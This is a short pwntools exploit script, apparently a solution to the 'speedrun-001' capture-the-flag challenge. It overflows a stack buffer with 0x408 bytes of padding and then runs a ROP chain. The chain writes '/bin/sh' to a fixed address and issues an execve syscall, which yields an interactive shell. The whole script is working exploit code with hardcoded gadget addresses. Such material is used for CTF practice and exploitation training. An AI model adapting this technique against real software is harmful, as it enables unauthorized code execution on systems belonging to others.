from pwn import *

# Attach to process
target = process('./speedrun-001')
# Uncomment for debugging:
# gdb.attach(target, gdbscript = 'b *0x400bad')

context.binary = './speedrun-001'  # Helps asm/rop features

# ROP Gadgets (addresses must be confirmed for your binary)
pop_rax = 0x415664
pop_rdi = 0x400686
pop_rsi = 0x4101f3
pop_rdx = 0x4498b5
write_gadget = 0x48d251  # mov qword ptr [rax], rdx ; ret
syscall = 0x40129c

binsh_addr = 0x6b6000

# Build ROP chain
rop = b''

# Write "/bin/sh\x00" string to memory
rop += p64(pop_rdx)
rop += b'/bin/sh\x00'             # must be 8 bytes, so null-terminated
rop += p64(pop_rax)
rop += p64(binsh_addr)
rop += p64(write_gadget)

# Prepare registers for execve("/bin/sh", NULL, NULL)
rop += p64(pop_rax)
rop += p64(0x3b)                  # syscall number for execve
rop += p64(pop_rdi)
rop += p64(binsh_addr)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(0)
rop += p64(syscall)

# Fill buffer up to saved RET
payload = b'A' * 0x408 + rop      # Use capital A for visibility

# Send exploit
target.sendline(payload)
target.interactive()

